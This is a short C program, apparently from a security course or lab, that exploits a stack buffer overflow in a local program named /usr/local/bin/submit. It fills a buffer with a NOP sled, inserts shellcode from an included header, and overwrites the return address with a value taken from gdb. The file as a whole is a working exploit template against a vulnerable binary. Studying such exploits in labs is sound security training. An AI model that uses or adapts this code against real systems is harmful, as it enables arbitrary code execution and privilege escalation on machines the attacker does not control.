/* Buffer overflow attack */
/* Inspired by https://www.youtube.com/watch?v=1S0aBV-Waeo */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "/usr/local/src/shellcode.h"

#define DEFAULT_BUFFER_SIZE             281
        /* 281 is the smallest buffer to cause overflow */
#define NOP                            0x90

int main(int argc, char *argv[]) {
  char *ptr, *args[3];
  int bsize=DEFAULT_BUFFER_SIZE;
  int i;

  args[0] = (char*) malloc(bsize);
  ptr = args[0];

        /* push a bit since the stack does not start from the first byte */
  *(ptr) = NOP;
  for (i = 0; i < bsize-79; i++)
    *(ptr++) = NOP;

        /* insert shellcode */
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i]; 

  for (i = 0; i < 10; i++) {
        /* Important! Return address, got from gdb command: x/200x $esp */
    *(ptr++) = 0xc3;
    *(ptr++) = 0xde;
    *(ptr++) = 0xbf;
    *(ptr++) = 0xff;
  }

        /* We are going to attack the print_usage since it uses the buffer.
           Thus we have to give the "-h" to let it excute. */
  args[1] = "-h";
  args[2] = NULL;

  return execve("/usr/local/bin/submit", args, NULL);
}


